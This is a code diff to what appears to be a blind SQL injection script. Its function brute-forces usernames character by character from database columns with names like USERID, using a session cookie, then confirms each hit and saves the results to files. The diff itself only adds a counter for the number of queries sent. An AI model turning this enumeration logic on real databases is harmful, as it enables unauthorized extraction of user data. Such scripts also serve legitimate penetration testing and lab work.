@@ -30,6 +30,7 @@ def get_usernames(cookie):
     keywords = ['USERID', 'USERNAME', 'USER_ID', 'USER_NAME', 'HANDLE']
     tables_columns = pickle.load(open('outputs/columns.pkl', 'rb'))
     alphabets = string.ascii_letters + string.digits + '_!@#$%^&*-+'
+    no_of_queries = 0
 
     for table_column in tables_columns:
         table_name, columns = tuple(table_column.items())[0]
@@ -47,6 +48,7 @@ def get_usernames(cookie):
                             word = queue_word + a
                             query = builder_query(column_name=column, table_name=table_name, length=len(word),
                                                   word=word)
+                            no_of_queries += 1
                             if inject.inject(cookie=cookie, query=query):
                                 print(f'Found Word: {word}, {len(word)} - Table: {table_name}')
                                 all_usernames.append(word)
@@ -57,9 +59,12 @@ def get_usernames(cookie):
 
                     for name in all_usernames:
                         query = check_query(column_name=column, table_name=table_name, user_id=name)
+                        no_of_queries += 1
                         if inject.check(cookie=cookie, query=query):
                             print(f'Found Username: {name}')
                             username_dict[(table_name, column)].append(name)
                     usernames.append(username_dict)
                     print(usernames)
                     pickle.dump(usernames, open('outputs/usernames.pkl', 'wb'))
+
+    print(f'No of queries: {no_of_queries}')
